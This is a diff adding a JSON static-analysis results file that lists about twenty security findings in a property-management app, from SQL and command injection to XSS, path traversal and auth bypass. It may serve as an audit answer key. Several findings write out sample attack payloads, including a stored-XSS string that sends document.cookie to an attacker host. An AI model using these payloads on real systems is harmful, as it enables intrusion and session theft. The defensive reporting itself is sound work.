@@ -1,0 +1,534 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "src/server/services/leaseFiltering.ts",
+      "start": {
+        "line": 6,
+        "col": 33,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "SQL injection in findLeasesBySavedFilter(): the user-controlled 'value' query parameter (GET /api/leases/saved-filter, app.ts:990-994) is concatenated directly into a raw SQL string passed to dataSource.query(): `WHERE ${filterColumn} = '${filterValue}'`. No parameterization or escaping is used. A staff user can inject e.g. `' OR '1'='1' --` to bypass the WHERE clause and exfiltrate all leases, or use stacked queries (pg executes multiple statements in a non-prepared query) to modify data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection",
+      "path": "src/server/services/unitBrochureExport.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "OS command injection in renderUnitBrochure(): the value of the attacker-controlled 'x-brochure-locale' request header (app.ts:1072) is interpolated into the shell command `pandoc ${sourcePath} --to=html5 --metadata=locale:${localeTag}` which is executed via execAsync() (shell:true). The route /api/units/:id/brochure only requires authentication (any role incl. tenants), so any authenticated user can inject shell metacharacters (e.g. `; touch /tmp/pwned`) to achieve arbitrary command execution on the server. Contrast with renderUnitCatalogEntry() which correctly whitelists locales and uses execFile().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection",
+      "path": "src/server/services/reportRendering.ts",
+      "start": {
+        "line": 25,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 52,
+        "offset": 0
+      },
+      "extra": {
+        "message": "OS command injection in renderLedgerExport(): the attacker-controlled 'ledgerPreset' cookie (read at app.ts:2362) is interpolated into `'${rendererScript} --preset=${exportPreset}'` and executed with spawn(command, [], { shell: true }). No allow-list is applied (unlike renderInspectionSummary). Any PropertyAdmin/PropertyManager hitting GET /api/reports/rent-roll/ledger-export can set a cookie such as `ledgerPreset=x; curl evil` and achieve arbitrary command execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection",
+      "path": "src/server/services/renewalFormulas.ts",
+      "start": {
+        "line": 2,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 2,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Arbitrary code execution via the Function constructor in evaluateCustomEscalationFormula(): a user-supplied 'formula' string (multipart field, route POST /api/leases/:id/renewal-forecast/custom-formula, app.ts:1018-1029) is wrapped in `return (${formulaExpression});` and evaluated with `new Function(...)`. A staff user (PropertyAdmin/PropertyManager) can inject arbitrary JavaScript (e.g. `process.mainModule.require('child_process').execSync('id')`) which executes server-side with full privileges.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.privilege-escalation",
+      "path": "src/server/services/householdUpdates.ts",
+      "start": {
+        "line": 4,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 5,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Mass-assignment / privilege escalation in applyHouseholdDetailsUpdate(): the entire unvalidated request body (route PATCH /api/tenant/household-details, app.ts:769-772, requireAuth only - any tenant) is Object.assign'ed onto both the TenantProfile and the current User entity. A tenant can set fields such as `role: 'property_admin'` (or `disabled: false`, `email`, etc.) and escalate themselves to PropertyAdmin. There is no schema/allow-list restricting which columns may be assigned.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-269: Improper Privilege Management",
+            "CWE-915: Improperly Controlled Modification of Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write",
+      "path": "src/server/services/listingMedia.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 44,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Path traversal / arbitrary file write in publishListingMedia(): the raw multipart upload filename is joined directly into the destination path `path.join(listingMediaDir, filename)` and written with fsp.writeFile (route POST /api/properties/:id/listing-media, app.ts:809). A filename like `../../../server/config.js` escapes the media directory, allowing a staff user to write arbitrary files anywhere the process can write (overwriting application code or config). Unlike the document-upload path (app.ts:1623) the filename is not sanitized, and unlike archiveInspectionEvidence() no random storage name is used.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.arbitrary-file-write",
+      "path": "src/server/services/renewalPacketArchival.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Path traversal in storeRenewalOfferPacket(): the user-supplied 'packetLabel' body field (route POST /api/leases/:id/renewal-offer/packet, app.ts:2503) is interpolated into `path.join(renewalPacketDir, packetLabel + '.json')` and written with fs.writeFileSync. A label containing `../` escapes the intended directory, letting a staff user write .json files to arbitrary locations. storeInspectionSignoffPacket() mitigates the same issue with path.basename(), but this function does not.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss",
+      "path": "src/client/views/AuditLogView.vue",
+      "start": {
+        "line": 23,
+        "col": 10,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 120,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Stored XSS in AuditLogView: actorFilterControl() builds a raw HTML string from log.actor.name (a value that any user controls via registration/profile name fields) and it is rendered with v-html at line 53. A user registering a name such as `<img src=x onerror=fetch('//attacker/?c='+document.cookie)>` will have the payload executed when a PropertyAdmin opens the audit log (/audit), allowing session hijacking / admin account takeover. Vue interpolation elsewhere would escape this, but v-html disables escaping.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "src/server/services/staffDirectory.ts",
+      "start": {
+        "line": 23,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 70,
+        "offset": 0
+      },
+      "extra": {
+        "message": "LDAP injection in searchStaffDirectory(): the user-supplied searchTerm (route POST /api/staff/directory-search, app.ts:2259) is concatenated into the LDAP filter `(|(cn=*${searchTerm}*)(mail=*${searchTerm}*))` without escaping, and passed to client.search(). An admin/manager can inject filter metacharacters (e.g. `*)(objectClass=*)(|(cn=*`) to broaden the search and enumerate arbitrary directory entries. Note escapeLdapFilterValue() exists and is used by verifyGroupMembership(), but not here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.header-based-bypass",
+      "path": "src/server/services/staffDirectory.ts",
+      "start": {
+        "line": 84,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 88,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Authorization bypass in resolveVendorGateDecision(): the decision is made from the client-supplied headers 'x-vendor-role' / 'x-vendor-employee-id' (route GET /api/vendors/gate-decision, app.ts:2708-2719, only requireAuth). If `x-vendor-role` equals the literal string 'admin' the function short-circuits and returns { access: true, escalationTier: 99 } WITHOUT any LDAP verification. Any authenticated user (even a tenant) can spoof this header to self-authorize vendor gate access. The same flaw exists in resolveFieldStaffGateDecision() at lines 123-127 (route /api/field-staff/gate-decision, app.ts:2721-2732).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-602: Client-Side Enforcement of Server-Side Security"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.header-based-bypass",
+      "path": "src/server/services/staffDirectory.ts",
+      "start": {
+        "line": 123,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 127,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Authorization bypass in resolveFieldStaffGateDecision(): same short-circuit as the vendor variant - if the spoofable request header 'x-field-role' is 'admin', access is granted with escalationTier 99 without performing the LDAP employee lookup (route GET /api/field-staff/gate-decision, app.ts:2721-2732, requireAuth only). Any authenticated low-privilege user can self-authorize field-staff access by setting the header.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-602: Client-Side Enforcement of Server-Side Security"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "src/server/services/deliveryDispatchIndex.ts",
+      "start": {
+        "line": 37,
+        "col": 40,
+        "offset": 0
+      },
+      "end": {
+        "line": 37,
+        "col": 92,
+        "offset": 0
+      },
+      "extra": {
+        "message": "XPath injection in findDeliveryByTrackingId(): the URL path parameter 'trackingId' (route GET /api/maintenance/deliveries/by-tracking-id/:trackingId, app.ts:2734-2737, requireAuth) is concatenated unescaped into the XPath-like predicate `[@trackingId='${trackingId}']`. Injecting e.g. `x' or '1'='1` makes the clause always-true and returns the entire delivery ledger for any authenticated user, disclosing tracking records and linked work-order ids. The sibling function findReturnShipmentByReference() escapes the same input (lines 41-47), confirming the omission here is a bug.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.url-fetch",
+      "path": "src/server/services/listingSyndication.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 32,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery in importSyndicatedListingFeed(): the 'feedUrl' query parameter (route GET /api/properties/feed-import, app.ts:2405-2407, PropertyAdmin only) is passed directly to fetch() with no host/IP allow-list or scheme restriction. An admin can point the URL at internal addresses (http://169.254.169.254/, internal services) and have the server fetch them. Compare importInspectionTemplateFeed(), which validates the hostname against an approved list.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect",
+      "path": "src/server/services/listingHandoff.ts",
+      "start": {
+        "line": 3,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Open redirect in resolveTourConfirmationRedirect(): the value of the 'x-redirect-url' request header is returned verbatim and used as the Location for reply.redirect() (route GET /api/listings/:id/tour-confirmation, app.ts:2475-2478, no authentication required). Any external URL (including attacker sites, or schemes like //evil.com) is accepted with no allow-list/validation, unlike resolveVendorHandoffRedirect() which restricts redirects to an allow-list.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Open Redirect"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.unverified-jwt",
+      "path": "src/server/services/dispatchTokens.ts",
+      "start": {
+        "line": 13,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Missing JWT signature verification in readDispatchHandoffToken(): app.jwt.decode() only base64-decodes the token and never verifies its signature or expiry. The dispatch-confirmation endpoint (POST /api/tickets/:id/dispatch-confirmation, app.ts:1353-1369) is unauthenticated and trusts this token to transition a ticket to InProgress, so any unauthenticated attacker can forge a token containing an arbitrary { ticketId, vendorName } and confirm dispatch on any known ticket id. readInspectionAccessToken() correctly uses jwt.verify(), confirming the omission.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.cookie-based-entitlement",
+      "path": "src/server/services/portalVisibility.ts",
+      "start": {
+        "line": 7,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Broken access control / IDOR in resolvePremiumDocumentByTier(): entitlement is decided purely by the client-controllable 'membershipTier' cookie - any user can set `membershipTier=premium` (route GET /api/documents/:id/tier-preview, app.ts:2562-2567, requireAuth). The endpoint then returns the metadata (originalName, category) of ANY document id, including documents belonging to other tenants/properties that the user is not authorized to access (no canAccessDocument check). This leaks sensitive document metadata across tenants.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-284: Improper Access Control",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data.hardcoded-credential",
+      "path": "src/server/services/ledgerSync.ts",
+      "start": {
+        "line": 11,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Hardcoded bearer credential: syncPaymentToLedger() embeds a full long-lived API bearer token directly in source code and sends it in the Authorization header to the accounting ledger endpoint. Anyone with access to the repository/source can extract this credential. It should be loaded from an environment variable/secret store like CARRIER_INTAKE_TOKEN is for the carrier sync.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-data.plaintext-pii",
+      "path": "src/server/services/depositRefunds.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Sensitive data exposure: recordDepositRefundPayoutMethod() persists the tenant's full bank account number and routing number in plaintext columns (refundPayoutAccountNumber / refundPayoutRoutingNumber). Unlike the SSN field (which is encrypted via encryptScreeningField before storage), these bank details are stored unencrypted at rest, exposing them in the event of a DB leak or a query/log dump.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.logging.sensitive-data",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1115,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 1117,
+        "col": 39,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Sensitive information logged: on the screening-lookup route (GET /api/tenants/screening-lookup) when no profile matches, the whole query object including the raw 'ssn' (and email) is passed to recordScreeningLookupMiss(), which logs it via logger.warn({ query }, ...) (screeningLookup.ts:4). Full Social Security numbers are written to application logs in cleartext.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-disclosure.stack-trace",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1502,
+        "col": 27,
+        "offset": 0
+      },
+      "end": {
+        "line": 1504,
+        "col": 65,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Stack-trace disclosure: the invoice-summary endpoint (POST /api/tickets/:id/invoice-summary) returns error.stack in the HTTP response whenever the client passes `reportLevel=extended`. Internal stack traces (file paths, code structure, dependency versions) are exposed to staff users. A similar stack leak exists via ?verbosity=trace on /api/portfolio/variance-report (portfolioDiagnostics.ts:1-6).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Exposure of Sensitive Information Through an Error Message"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.fixed-non-expiring-token",
+      "path": "src/server/services/sessionTokens.ts",
+      "start": {
+        "line": 4,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 6,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Non-expiring session tokens: issueUserSession() calls reply.jwtSign({ sub, role }) with no expiresIn, so the resulting session JWT carries no exp claim and remains valid indefinitely (only the browser-session cookie life limits it). A stolen token is valid forever and there is no server-side revocation on password change/disable. Sessions should be issued with a short expiry and sliding renewal.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
